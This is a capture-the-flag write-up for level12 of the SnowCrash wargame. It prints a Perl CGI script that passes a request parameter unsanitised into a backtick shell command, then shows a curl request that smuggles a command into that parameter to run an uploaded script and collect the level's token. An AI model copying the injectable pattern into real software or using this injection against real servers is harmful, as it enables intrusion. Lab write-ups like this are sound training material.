```
level12@SnowCrash:~$ ls
level12.pl

level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

The script runs a webserver on localhost via the port 4646 and can take parameters x and y.

Let's verify it with curl:

```
level12@SnowCrash:~$ curl -I localhost:4646
HTTP/1.1 200 OK
Date: Tue, 22 Sep 2020 12:57:04 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Content-Type: text/html

```

At one point, the function t executes the parameter x when comparing it to /tmp/xd.

We can exploit that situation by putting a script as the parameter x that executes the command getflag and saves the result in /tmp/token.

```
scp -P 4242 SCRIPT level12@10.11.200.61:/tmp

level12@SnowCrash:~$ chmod 777 /tmp/SCRIPT
```

Since the function t will capitalize every charater of the parameter x before executing it, we create the SCRIPT already in capital letters.  
We specify to look for it in every directories with the symbol * because it's case-insensitive.

```
level12@SnowCrash:~$ curl localhost:4646?x='`/*/SCRIPT`'
..

level12@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```